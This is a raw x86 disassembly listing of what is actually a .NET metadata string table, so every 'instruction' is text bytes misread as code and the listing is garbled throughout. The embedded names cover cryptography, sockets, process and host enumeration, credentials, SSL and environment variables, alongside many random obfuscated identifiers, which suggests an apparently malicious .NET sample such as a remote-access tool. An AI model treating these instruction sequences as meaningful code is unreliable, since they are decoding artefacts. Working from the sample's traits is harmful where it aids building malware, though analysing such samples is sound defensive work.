  40947a:	35 43 72 79 70       	xor    $0x70797243,%eax
  40947f:	74 6f                	je     0x4094f0
  409481:	53                   	push   %ebx
  409482:	65 72 76             	gs jb  0x4094fb
  409485:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  40948c:	69 64 65 72 00 52 53 	imul   $0x41535200,0x72(%ebp,%eiz,2),%esp
  409493:	41 
  409494:	43                   	inc    %ebx
  409495:	72 79                	jb     0x409510
  409497:	70 74                	jo     0x40950d
  409499:	6f                   	outsl  %ds:(%esi),(%dx)
  40949a:	53                   	push   %ebx
  40949b:	65 72 76             	gs jb  0x409514
  40949e:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  4094a5:	69 64 65 72 00 41 65 	imul   $0x73654100,0x72(%ebp,%eiz,2),%esp
  4094ac:	73 
  4094ad:	43                   	inc    %ebx
  4094ae:	72 79                	jb     0x409529
  4094b0:	70 74                	jo     0x409526
  4094b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4094b3:	53                   	push   %ebx
  4094b4:	65 72 76             	gs jb  0x40952d
  4094b7:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  4094be:	69 64 65 72 00 53 74 	imul   $0x72745300,0x72(%ebp,%eiz,2),%esp
  4094c5:	72 
  4094c6:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  4094cd:	64 65 72 00          	fs gs jb 0x4094d1
  4094d1:	4d                   	dec    %ebp
  4094d2:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4094d9:	74 2e                	je     0x409509
  4094db:	43                   	inc    %ebx
  4094dc:	53                   	push   %ebx
  4094dd:	68 61 72 70 2e       	push   $0x2e707261
  4094e2:	52                   	push   %edx
  4094e3:	75 6e                	jne    0x409553
  4094e5:	74 69                	je     0x409550
  4094e7:	6d                   	insl   (%dx),%es:(%edi)
  4094e8:	65 42                	gs inc %edx
  4094ea:	69 6e 64 65 72 00 43 	imul   $0x43007265,0x64(%esi),%ebp
  4094f1:	61                   	popa
  4094f2:	6c                   	insb   (%dx),%es:(%edi)
  4094f3:	6c                   	insb   (%dx),%es:(%edi)
  4094f4:	53                   	push   %ebx
  4094f5:	69 74 65 42 69 6e 64 	imul   $0x65646e69,0x42(%ebp,%eiz,2),%esi
  4094fc:	65 
  4094fd:	72 00                	jb     0x4094ff
  4094ff:	67 65 74 5f          	addr16 gs je 0x409562
  409503:	42                   	inc    %edx
  409504:	75 66                	jne    0x40956c
  409506:	66 65 72 00          	data16 gs jb 0x40950a
  40950a:	73 65                	jae    0x409571
  40950c:	74 5f                	je     0x40956d
  40950e:	42                   	inc    %edx
  40950f:	75 66                	jne    0x409577
  409511:	66 65 72 00          	data16 gs jb 0x409515
  409515:	67 65 74 5f          	addr16 gs je 0x409578
  409519:	41                   	inc    %ecx
  40951a:	73 49                	jae    0x409565
  40951c:	6e                   	outsb  %ds:(%esi),(%dx)
  40951d:	74 65                	je     0x409584
  40951f:	67 65 72 00          	addr16 gs jb 0x409523
  409523:	73 65                	jae    0x40958a
  409525:	74 5f                	je     0x409586
  409527:	41                   	inc    %ecx
  409528:	73 49                	jae    0x409573
  40952a:	6e                   	outsb  %ds:(%esi),(%dx)
  40952b:	74 65                	je     0x409592
  40952d:	67 65 72 00          	addr16 gs jb 0x409531
  409531:	4d                   	dec    %ebp
  409532:	61                   	popa
  409533:	6e                   	outsb  %ds:(%esi),(%dx)
  409534:	61                   	popa
  409535:	67 65 6d             	gs insl (%dx),%es:(%di)
  409538:	65 6e                	outsb  %gs:(%esi),(%dx)
  40953a:	74 4f                	je     0x40958b
  40953c:	62 6a 65             	bound  %ebp,0x65(%edx)
  40953f:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  409543:	61                   	popa
  409544:	72 63                	jb     0x4095a9
  409546:	68 65 72 00 53       	push   $0x53007265
  40954b:	65 73 73             	gs jae 0x4095c1
  40954e:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  409555:	6e                   	outsb  %ds:(%esi),(%dx)
  409556:	67 45                	addr16 inc %ebp
  409558:	76 65                	jbe    0x4095bf
  40955a:	6e                   	outsb  %ds:(%esi),(%dx)
  40955b:	74 48                	je     0x4095a5
  40955d:	61                   	popa
  40955e:	6e                   	outsb  %ds:(%esi),(%dx)
  40955f:	64 6c                	fs insb (%dx),%es:(%edi)
  409561:	65 72 00             	gs jb  0x409564
  409564:	54                   	push   %esp
  409565:	69 6d 65 72 00 54 6f 	imul   $0x6f540072,0x65(%ebp),%ebp
  40956c:	55                   	push   %ebp
  40956d:	70 70                	jo     0x4095df
  40956f:	65 72 00             	gs jb  0x409572
  409572:	43                   	inc    %ebx
  409573:	75 72                	jne    0x4095e7
  409575:	72 65                	jb     0x4095dc
  409577:	6e                   	outsb  %ds:(%esi),(%dx)
  409578:	74 55                	je     0x4095cf
  40957a:	73 65                	jae    0x4095e1
  40957c:	72 00                	jb     0x40957e
  40957e:	53                   	push   %ebx
  40957f:	74 72                	je     0x4095f3
  409581:	65 61                	gs popa
  409583:	6d                   	insl   (%dx),%es:(%edi)
  409584:	57                   	push   %edi
  409585:	72 69                	jb     0x4095f0
  409587:	74 65                	je     0x4095ee
  409589:	72 00                	jb     0x40958b
  40958b:	54                   	push   %esp
  40958c:	65 78 74             	gs js  0x409603
  40958f:	57                   	push   %edi
  409590:	72 69                	jb     0x4095fb
  409592:	74 65                	je     0x4095f9
  409594:	72 00                	jb     0x409596
  409596:	45                   	inc    %ebp
  409597:	6e                   	outsb  %ds:(%esi),(%dx)
  409598:	74 65                	je     0x4095ff
  40959a:	72 00                	jb     0x40959c
  40959c:	42                   	inc    %edx
  40959d:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  4095a4:	72 
  4095a5:	74 65                	je     0x40960c
  4095a7:	72 00                	jb     0x4095a9
  4095a9:	54                   	push   %esp
  4095aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4095ab:	4c                   	dec    %esp
  4095ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4095ad:	77 65                	ja     0x409614
  4095af:	72 00                	jb     0x4095b1
  4095b1:	62 78 69             	bound  %edi,0x69(%eax)
  4095b4:	72 67                	jb     0x40961d
  4095b6:	5a                   	pop    %edx
  4095b7:	6a 4d                	push   $0x4d
  4095b9:	66 53                	push   %bx
  4095bb:	53                   	push   %ebx
  4095bc:	57                   	push   %edi
  4095bd:	69 72 00 55 4d 79 62 	imul   $0x62794d55,0x0(%edx),%esi
  4095c4:	56                   	push   %esi
  4095c5:	4b                   	dec    %ebx
  4095c6:	66 59                	pop    %cx
  4095c8:	59                   	pop    %ecx
  4095c9:	69 72 00 49 45 6e 75 	imul   $0x756e4549,0x0(%edx),%esi
  4095d0:	6d                   	insl   (%dx),%es:(%edi)
  4095d1:	65 72 61             	gs jb  0x409635
  4095d4:	74 6f                	je     0x409645
  4095d6:	72 00                	jb     0x4095d8
  4095d8:	4d                   	dec    %ebp
  4095d9:	61                   	popa
  4095da:	6e                   	outsb  %ds:(%esi),(%dx)
  4095db:	61                   	popa
  4095dc:	67 65 6d             	gs insl (%dx),%es:(%di)
  4095df:	65 6e                	outsb  %gs:(%esi),(%dx)
  4095e1:	74 4f                	je     0x409632
  4095e3:	62 6a 65             	bound  %ebp,0x65(%edx)
  4095e6:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  4095ea:	75 6d                	jne    0x409659
  4095ec:	65 72 61             	gs jb  0x409650
  4095ef:	74 6f                	je     0x409660
  4095f1:	72 00                	jb     0x4095f3
  4095f3:	53                   	push   %ebx
  4095f4:	79 73                	jns    0x409669
  4095f6:	74 65                	je     0x40965d
  4095f8:	6d                   	insl   (%dx),%es:(%edi)
  4095f9:	2e 43                	cs inc %ebx
  4095fb:	6f                   	outsl  %ds:(%esi),(%dx)
  4095fc:	6c                   	insb   (%dx),%es:(%edi)
  4095fd:	6c                   	insb   (%dx),%es:(%edi)
  4095fe:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409603:	6e                   	outsb  %ds:(%esi),(%dx)
  409604:	73 2e                	jae    0x409634
  409606:	49                   	dec    %ecx
  409607:	45                   	inc    %ebp
  409608:	6e                   	outsb  %ds:(%esi),(%dx)
  409609:	75 6d                	jne    0x409678
  40960b:	65 72 61             	gs jb  0x40966f
  40960e:	62 6c 65 2e          	bound  %ebp,0x2e(%ebp,%eiz,2)
  409612:	47                   	inc    %edi
  409613:	65 74 45             	gs je  0x40965b
  409616:	6e                   	outsb  %ds:(%esi),(%dx)
  409617:	75 6d                	jne    0x409686
  409619:	65 72 61             	gs jb  0x40967d
  40961c:	74 6f                	je     0x40968d
  40961e:	72 00                	jb     0x409620
  409620:	41                   	inc    %ecx
  409621:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  409625:	61                   	popa
  409626:	74 6f                	je     0x409697
  409628:	72 00                	jb     0x40962a
  40962a:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  40962f:	00 2e                	add    %ch,(%esi)
  409631:	63 63 74             	arpl   %esp,0x74(%ebx)
  409634:	6f                   	outsl  %ds:(%esi),(%dx)
  409635:	72 00                	jb     0x409637
  409637:	4d                   	dec    %ebp
  409638:	6f                   	outsl  %ds:(%esi),(%dx)
  409639:	6e                   	outsb  %ds:(%esi),(%dx)
  40963a:	69 74 6f 72 00 43 72 	imul   $0x65724300,0x72(%edi,%ebp,2),%esi
  409641:	65 
  409642:	61                   	popa
  409643:	74 65                	je     0x4096aa
  409645:	44                   	inc    %esp
  409646:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  40964a:	70 74                	jo     0x4096c0
  40964c:	6f                   	outsl  %ds:(%esi),(%dx)
  40964d:	72 00                	jb     0x40964f
  40964f:	43                   	inc    %ebx
  409650:	72 65                	jb     0x4096b7
  409652:	61                   	popa
  409653:	74 65                	je     0x4096ba
  409655:	45                   	inc    %ebp
  409656:	6e                   	outsb  %ds:(%esi),(%dx)
  409657:	63 72 79             	arpl   %esi,0x79(%edx)
  40965a:	70 74                	jo     0x4096d0
  40965c:	6f                   	outsl  %ds:(%esi),(%dx)
  40965d:	72 00                	jb     0x40965f
  40965f:	49                   	dec    %ecx
  409660:	6e                   	outsb  %ds:(%esi),(%dx)
  409661:	74 50                	je     0x4096b3
  409663:	74 72                	je     0x4096d7
  409665:	00 55 78             	add    %dl,0x78(%ebp)
  409668:	63 44 52 66          	arpl   %eax,0x66(%edx,%edx,2)
  40966c:	56                   	push   %esi
  40966d:	72 42                	jb     0x4096b1
  40966f:	4f                   	dec    %edi
  409670:	6c                   	insb   (%dx),%es:(%edi)
  409671:	77 72                	ja     0x4096e5
  409673:	00 4d 71             	add    %cl,0x71(%ebp)
  409676:	50                   	push   %eax
  409677:	77 62                	ja     0x4096db
  409679:	70 58                	jo     0x4096d3
  40967b:	61                   	popa
  40967c:	65 63 79 72          	arpl   %edi,%gs:0x72(%ecx)
  409680:	00 42 74             	add    %al,0x74(%edx)
  409683:	58                   	pop    %eax
  409684:	48                   	dec    %eax
  409685:	56                   	push   %esi
  409686:	6b 4d 77 49          	imul   $0x49,0x77(%ebp),%ecx
  40968a:	78 46                	js     0x4096d2
  40968c:	43                   	inc    %ebx
  40968d:	73 00                	jae    0x40968f
  40968f:	54                   	push   %esp
  409690:	6d                   	insl   (%dx),%es:(%edi)
  409691:	6a 42                	push   $0x42
  409693:	63 53 57             	arpl   %edx,0x57(%ebx)
  409696:	50                   	push   %eax
  409697:	4f                   	dec    %edi
  409698:	4c                   	dec    %esp
  409699:	73 00                	jae    0x40969b
  40969b:	7a 55                	jp     0x4096f2
  40969d:	78 70                	js     0x40970f
  40969f:	55                   	push   %ebp
  4096a0:	4c                   	dec    %esp
  4096a1:	49                   	dec    %ecx
  4096a2:	4a                   	dec    %edx
  4096a3:	65 55                	gs push %ebp
  4096a5:	73 00                	jae    0x4096a7
  4096a7:	4f                   	dec    %edi
  4096a8:	57                   	push   %edi
  4096a9:	42                   	inc    %edx
  4096aa:	68 67 5a 73 4f       	push   $0x4f735a67
  4096af:	49                   	dec    %ecx
  4096b0:	50                   	push   %eax
  4096b1:	6a 7a                	push   $0x7a
  4096b3:	61                   	popa
  4096b4:	73 00                	jae    0x4096b6
  4096b6:	77 74                	ja     0x40972c
  4096b8:	41                   	inc    %ecx
  4096b9:	74 43                	je     0x4096fe
  4096bb:	50                   	push   %eax
  4096bc:	76 62                	jbe    0x409720
  4096be:	62 73 00             	bound  %esi,0x0(%ebx)
  4096c1:	66 4e                	dec    %si
  4096c3:	62 6e 6f             	bound  %ebp,0x6f(%esi)
  4096c6:	74 65                	je     0x40972d
  4096c8:	6e                   	outsb  %ds:(%esi),(%dx)
  4096c9:	62 73 00             	bound  %esi,0x0(%ebx)
  4096cc:	53                   	push   %ebx
  4096cd:	79 73                	jns    0x409742
  4096cf:	74 65                	je     0x409736
  4096d1:	6d                   	insl   (%dx),%es:(%edi)
  4096d2:	2e 44                	cs inc %esp
  4096d4:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  4096db:	69 63 73 00 4d 69 63 	imul   $0x63694d00,0x73(%ebx),%esp
  4096e2:	72 6f                	jb     0x409753
  4096e4:	73 6f                	jae    0x409755
  4096e6:	66 74 2e             	data16 je 0x409717
  4096e9:	56                   	push   %esi
  4096ea:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  4096f1:	73 69                	jae    0x40975c
  4096f3:	63 2e                	arpl   %ebp,(%esi)
  4096f5:	44                   	inc    %esp
  4096f6:	65 76 69             	gs jbe 0x409762
  4096f9:	63 65 73             	arpl   %esp,0x73(%ebp)
  4096fc:	00 53 79             	add    %dl,0x79(%ebx)
  4096ff:	73 74                	jae    0x409775
  409701:	65 6d                	gs insl (%dx),%es:(%edi)
  409703:	2e 52                	cs push %edx
  409705:	75 6e                	jne    0x409775
  409707:	74 69                	je     0x409772
  409709:	6d                   	insl   (%dx),%es:(%edi)
  40970a:	65 2e 49             	gs cs dec %ecx
  40970d:	6e                   	outsb  %ds:(%esi),(%dx)
  40970e:	74 65                	je     0x409775
  409710:	72 6f                	jb     0x409781
  409712:	70 53                	jo     0x409767
  409714:	65 72 76             	gs jb  0x40978d
  409717:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  40971e:	73 74                	jae    0x409794
  409720:	65 6d                	gs insl (%dx),%es:(%edi)
  409722:	2e 52                	cs push %edx
  409724:	75 6e                	jne    0x409794
  409726:	74 69                	je     0x409791
  409728:	6d                   	insl   (%dx),%es:(%edi)
  409729:	65 2e 43             	gs cs inc %ebx
  40972c:	6f                   	outsl  %ds:(%esi),(%dx)
  40972d:	6d                   	insl   (%dx),%es:(%edi)
  40972e:	70 69                	jo     0x409799
  409730:	6c                   	insb   (%dx),%es:(%edi)
  409731:	65 72 53             	gs jb  0x409787
  409734:	65 72 76             	gs jb  0x4097ad
  409737:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  40973e:	62 75 67             	bound  %esi,0x67(%ebp)
  409741:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  409748:	65 
  409749:	73 00                	jae    0x40974b
  40974b:	45                   	inc    %ebp
  40974c:	78 70                	js     0x4097be
  40974e:	61                   	popa
  40974f:	6e                   	outsb  %ds:(%esi),(%dx)
  409750:	64 45                	fs inc %ebp
  409752:	6e                   	outsb  %ds:(%esi),(%dx)
  409753:	76 69                	jbe    0x4097be
  409755:	72 6f                	jb     0x4097c6
  409757:	6e                   	outsb  %ds:(%esi),(%dx)
  409758:	6d                   	insl   (%dx),%es:(%edi)
  409759:	65 6e                	outsb  %gs:(%esi),(%dx)
  40975b:	74 56                	je     0x4097b3
  40975d:	61                   	popa
  40975e:	72 69                	jb     0x4097c9
  409760:	61                   	popa
  409761:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  409765:	00 47 65             	add    %al,0x65(%edi)
  409768:	74 50                	je     0x4097ba
  40976a:	72 6f                	jb     0x4097db
  40976c:	63 65 73             	arpl   %esp,0x73(%ebp)
  40976f:	73 65                	jae    0x4097d6
  409771:	73 00                	jae    0x409773
  409773:	47                   	inc    %edi
  409774:	65 74 48             	gs je  0x4097bf
  409777:	6f                   	outsl  %ds:(%esi),(%dx)
  409778:	73 74                	jae    0x4097ee
  40977a:	41                   	inc    %ecx
  40977b:	64 64 72 65          	fs fs jb 0x4097e4
  40977f:	73 73                	jae    0x4097f4
  409781:	65 73 00             	gs jae 0x409784
  409784:	53                   	push   %ebx
  409785:	79 73                	jns    0x4097fa
  409787:	74 65                	je     0x4097ee
  409789:	6d                   	insl   (%dx),%es:(%edi)
  40978a:	2e 53                	cs push %ebx
  40978c:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409790:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  409797:	70 
  409798:	74 6f                	je     0x409809
  40979a:	67 72 61             	addr16 jb 0x4097fe
  40979d:	70 68                	jo     0x409807
  40979f:	79 2e                	jns    0x4097cf
  4097a1:	58                   	pop    %eax
  4097a2:	35 30 39 43 65       	xor    $0x65433930,%eax
  4097a7:	72 74                	jb     0x40981d
  4097a9:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4097b0:	73 00                	jae    0x4097b2
  4097b2:	52                   	push   %edx
  4097b3:	66 63 32             	arpl   %si,(%edx)
  4097b6:	38 39                	cmp    %bh,(%ecx)
  4097b8:	38 44 65 72          	cmp    %al,0x72(%ebp,%eiz,2)
  4097bc:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%esi),%esi
  4097c3:	73 00                	jae    0x4097c5
  4097c5:	52                   	push   %edx
  4097c6:	65 61                	gs popa
  4097c8:	64 41                	fs inc %ecx
  4097ca:	6c                   	insb   (%dx),%es:(%edi)
  4097cb:	6c                   	insb   (%dx),%es:(%edi)
  4097cc:	42                   	inc    %edx
  4097cd:	79 74                	jns    0x409843
  4097cf:	65 73 00             	gs jae 0x4097d2
  4097d2:	47                   	inc    %edi
  4097d3:	65 74 42             	gs je  0x409818
  4097d6:	79 74                	jns    0x40984c
  4097d8:	65 73 00             	gs jae 0x4097db
  4097db:	43                   	inc    %ebx
  4097dc:	53                   	push   %ebx
  4097dd:	68 61 72 70 41       	push   $0x41707261
  4097e2:	72 67                	jb     0x40984b
  4097e4:	75 6d                	jne    0x409853
  4097e6:	65 6e                	outsb  %gs:(%esi),(%dx)
  4097e8:	74 49                	je     0x409833
  4097ea:	6e                   	outsb  %ds:(%esi),(%dx)
  4097eb:	66 6f                	outsw  %ds:(%esi),(%dx)
  4097ed:	46                   	inc    %esi
  4097ee:	6c                   	insb   (%dx),%es:(%edi)
  4097ef:	61                   	popa
  4097f0:	67 73 00             	addr16 jae 0x4097f3
  4097f3:	43                   	inc    %ebx
  4097f4:	53                   	push   %ebx
  4097f5:	68 61 72 70 42       	push   $0x42707261
  4097fa:	69 6e 64 65 72 46 6c 	imul   $0x6c467265,0x64(%esi),%ebp
  409801:	61                   	popa
  409802:	67 73 00             	addr16 jae 0x409805
  409805:	53                   	push   %ebx
  409806:	74 72                	je     0x40987a
  409808:	69 6e 67 73 00 53 65 	imul   $0x65530073,0x67(%esi),%ebp
  40980f:	73 73                	jae    0x409884
  409811:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  409818:	6e                   	outsb  %ds:(%esi),(%dx)
  409819:	67 45                	addr16 inc %ebp
  40981b:	76 65                	jbe    0x409882
  40981d:	6e                   	outsb  %ds:(%esi),(%dx)
  40981e:	74 41                	je     0x409861
  409820:	72 67                	jb     0x409889
  409822:	73 00                	jae    0x409824
  409824:	67 4b                	addr16 dec %ebx
  409826:	72 58                	jb     0x409880
  409828:	62 48 75             	bound  %ecx,0x75(%eax)
  40982b:	6f                   	outsl  %ds:(%esi),(%dx)
  40982c:	66 74 44             	data16 je 0x409873
  40982f:	68 73 00 63 6e       	push   $0x6e630073
  409834:	4e                   	dec    %esi
  409835:	44                   	inc    %esp
  409836:	6f                   	outsl  %ds:(%esi),(%dx)
  409837:	45                   	inc    %ebp
  409838:	54                   	push   %esp
  409839:	48                   	dec    %eax
  40983a:	5a                   	pop    %edx
  40983b:	46                   	inc    %esi
  40983c:	6b 69 73 00          	imul   $0x0,0x73(%ecx),%ebp
  409840:	49                   	dec    %ecx
  409841:	43                   	inc    %ebx
  409842:	72 65                	jb     0x4098a9
  409844:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  409847:	74 69                	je     0x4098b2
  409849:	61                   	popa
  40984a:	6c                   	insb   (%dx),%es:(%edi)
  40984b:	73 00                	jae    0x40984d
  40984d:	73 65                	jae    0x4098b4
  40984f:	74 5f                	je     0x4098b0
  409851:	43                   	inc    %ebx
  409852:	72 65                	jb     0x4098b9
  409854:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  409857:	74 69                	je     0x4098c2
  409859:	61                   	popa
  40985a:	6c                   	insb   (%dx),%es:(%edi)
  40985b:	73 00                	jae    0x40985d
  40985d:	45                   	inc    %ebp
  40985e:	71 75                	jno    0x4098d5
  409860:	61                   	popa
  409861:	6c                   	insb   (%dx),%es:(%edi)
  409862:	73 00                	jae    0x409864
  409864:	53                   	push   %ebx
  409865:	73 6c                	jae    0x4098d3
  409867:	50                   	push   %eax
  409868:	72 6f                	jb     0x4098d9
  40986a:	74 6f                	je     0x4098db
  40986c:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  40986f:	73 00                	jae    0x409871
  409871:	53                   	push   %ebx
  409872:	79 73                	jns    0x4098e7
  409874:	74 65                	je     0x4098db
  409876:	6d                   	insl   (%dx),%es:(%edi)
  409877:	2e 57                	cs push %edi
  409879:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  409880:	46                   	inc    %esi
  409881:	6f                   	outsl  %ds:(%esi),(%dx)
  409882:	72 6d                	jb     0x4098f1
  409884:	73 00                	jae    0x409886
  409886:	44                   	inc    %esp
  409887:	6e                   	outsb  %ds:(%esi),(%dx)
  409888:	73 00                	jae    0x40988a
  40988a:	43                   	inc    %ebx
  40988b:	6f                   	outsl  %ds:(%esi),(%dx)
  40988c:	6e                   	outsb  %ds:(%esi),(%dx)
  40988d:	74 61                	je     0x4098f0
  40988f:	69 6e 73 00 53 79 73 	imul   $0x73795300,0x73(%esi),%ebp
  409896:	74 65                	je     0x4098fd
  409898:	6d                   	insl   (%dx),%es:(%edi)
  409899:	2e 43                	cs inc %ebx
  40989b:	6f                   	outsl  %ds:(%esi),(%dx)
  40989c:	6c                   	insb   (%dx),%es:(%edi)
  40989d:	6c                   	insb   (%dx),%es:(%edi)
  40989e:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4098a3:	6e                   	outsb  %ds:(%esi),(%dx)
  4098a4:	73 00                	jae    0x4098a6
  4098a6:	53                   	push   %ebx
  4098a7:	74 72                	je     0x40991b
  4098a9:	69 6e 67 53 70 6c 69 	imul   $0x696c7053,0x67(%esi),%ebp
  4098b0:	74 4f                	je     0x409901
  4098b2:	70 74                	jo     0x409928
  4098b4:	69 6f 6e 73 00 71 64 	imul   $0x64710073,0x6e(%edi),%ebp
  4098bb:	4d                   	dec    %ebp
  4098bc:	49                   	dec    %ecx
  4098bd:	76 6e                	jbe    0x40992d
  4098bf:	67 52                	addr16 push %edx
  4098c1:	59                   	pop    %ecx
  4098c2:	61                   	popa
  4098c3:	68 6f 71 73 00       	push   $0x73716f
  4098c8:	47                   	inc    %edi
  4098c9:	65 74 49             	gs je  0x409915
  4098cc:	6d                   	insl   (%dx),%es:(%edi)
  4098cd:	61                   	popa
  4098ce:	67 65 44             	addr16 gs inc %esp
  4098d1:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  4098d5:	65 72 73             	gs jb  0x40994b
  4098d8:	00 52 75             	add    %dl,0x75(%edx)
  4098db:	6e                   	outsb  %ds:(%esi),(%dx)
  4098dc:	74 69                	je     0x409947
  4098de:	6d                   	insl   (%dx),%es:(%edi)
  4098df:	65 48                	gs dec %eax
  4098e1:	65 6c                	gs insb (%dx),%es:(%edi)
  4098e3:	70 65                	jo     0x40994a
  4098e5:	72 73                	jb     0x40995a
  4098e7:	00 53 73             	add    %dl,0x73(%ebx)
  4098ea:	6c                   	insb   (%dx),%es:(%edi)
  4098eb:	50                   	push   %eax
  4098ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4098ed:	6c                   	insb   (%dx),%es:(%edi)
  4098ee:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  4098f5:	72 73                	jb     0x40996a
  4098f7:	00 46 69             	add    %al,0x69(%esi)
  4098fa:	6c                   	insb   (%dx),%es:(%edi)
  4098fb:	65 41                	gs inc %ecx
  4098fd:	63 63 65             	arpl   %esp,0x65(%ebx)
  409900:	73 73                	jae    0x409975
  409902:	00 47 65             	add    %al,0x65(%edi)
  409905:	74 43                	je     0x40994a
  409907:	75 72                	jne    0x40997b
  409909:	72 65                	jb     0x409970
  40990b:	6e                   	outsb  %ds:(%esi),(%dx)
  40990c:	74 50                	je     0x40995e
  40990e:	72 6f                	jb     0x40997f
  409910:	63 65 73             	arpl   %esp,0x73(%ebp)
  409913:	73 00                	jae    0x409915
  409915:	49                   	dec    %ecx
  409916:	50                   	push   %eax
  409917:	41                   	inc    %ecx
  409918:	64 64 72 65          	fs fs jb 0x409981
  40991c:	73 73                	jae    0x409991
  40991e:	00 58 68             	add    %bl,0x68(%eax)
  409921:	59                   	pop    %ecx
  409922:	78 4d                	js     0x409971
  409924:	47                   	inc    %edi
  409925:	57                   	push   %edi
  409926:	52                   	push   %edx
  409927:	4a                   	dec    %edx
  409928:	76 4d                	jbe    0x409977
  40992a:	50                   	push   %eax
  40992b:	6a 73                	push   $0x73
  40992d:	73 00                	jae    0x40992f
  40992f:	53                   	push   %ebx
  409930:	79 73                	jns    0x4099a5
  409932:	74 65                	je     0x409999
  409934:	6d                   	insl   (%dx),%es:(%edi)
  409935:	2e 4e                	cs dec %esi
  409937:	65 74 2e             	gs je  0x409968
  40993a:	53                   	push   %ebx
  40993b:	6f                   	outsl  %ds:(%esi),(%dx)
  40993c:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40993f:	74 73                	je     0x4099b4
  409941:	00 73 65             	add    %dh,0x65(%ebx)
  409944:	74 5f                	je     0x4099a5
  409946:	41                   	inc    %ecx
  409947:	72 67                	jb     0x4099b0
  409949:	75 6d                	jne    0x4099b8
  40994b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40994d:	74 73                	je     0x4099c2
  40994f:	00 53 79             	add    %dl,0x79(%ebx)
  409952:	73 74                	jae    0x4099c8
  409954:	65 6d                	gs insl (%dx),%es:(%edi)
  409956:	45                   	inc    %ebp
  409957:	76 65                	jbe    0x4099be
  409959:	6e                   	outsb  %ds:(%esi),(%dx)
  40995a:	74 73                	je     0x4099cf
  40995c:	00 45 78             	add    %al,0x78(%ebp)
  40995f:	69 73 74 73 00 58 44 	imul   $0x44580073,0x74(%ebx),%esi
  409966:	6a 6a                	push   $0x6a
  409968:	4a                   	dec    %edx
  409969:	74 76                	je     0x4099e1
  40996b:	6c                   	insb   (%dx),%es:(%edi)
  40996c:	49                   	dec    %ecx
  40996d:	43                   	inc    %ebx
  40996e:	59                   	pop    %ecx
  40996f:	41                   	inc    %ecx
  409970:	74 00                	je     0x409972
  409972:	6a 48                	push   $0x48
  409974:	6c                   	insb   (%dx),%es:(%edi)
  409975:	66 69 6a 6e 6b 6f    	imul   $0x6f6b,0x6e(%edx),%bp
  40997b:	4a                   	dec    %edx
  40997c:	68 51 74 00 43       	push   $0x43007451
  409981:	6f                   	outsl  %ds:(%esi),(%dx)
  409982:	6e                   	outsb  %ds:(%esi),(%dx)
  409983:	63 61 74             	arpl   %esp,0x74(%ecx)
  409986:	00 49 6d             	add    %cl,0x6d(%ecx)
  409989:	61                   	popa
  40998a:	67 65 46             	addr16 gs inc %esi
  40998d:	6f                   	outsl  %ds:(%esi),(%dx)
  40998e:	72 6d                	jb     0x4099fd
  409990:	61                   	popa
  409991:	74 00                	je     0x409993
  409993:	67 65 74 5f          	addr16 gs je 0x4099f6
  409997:	41                   	inc    %ecx
  409998:	73 46                	jae    0x4099e0
  40999a:	6c                   	insb   (%dx),%es:(%edi)
  40999b:	6f                   	outsl  %ds:(%esi),(%dx)
  40999c:	61                   	popa
  40999d:	74 00                	je     0x40999f
  40999f:	73 65                	jae    0x409a06
  4099a1:	74 5f                	je     0x409a02
  4099a3:	41                   	inc    %ecx
  4099a4:	73 46                	jae    0x4099ec
  4099a6:	6c                   	insb   (%dx),%es:(%edi)
  4099a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4099a8:	61                   	popa
  4099a9:	74 00                	je     0x4099ab
  4099ab:	4d                   	dec    %ebp
  4099ac:	61                   	popa
  4099ad:	6e                   	outsb  %ds:(%esi),(%dx)
  4099ae:	61                   	popa
  4099af:	67 65 6d             	gs insl (%dx),%es:(%di)
  4099b2:	65 6e                	outsb  %gs:(%esi),(%dx)
  4099b4:	74 42                	je     0x4099f8
  4099b6:	61                   	popa
  4099b7:	73 65                	jae    0x409a1e
  4099b9:	4f                   	dec    %edi
  4099ba:	62 6a 65             	bound  %ebp,0x65(%edx)
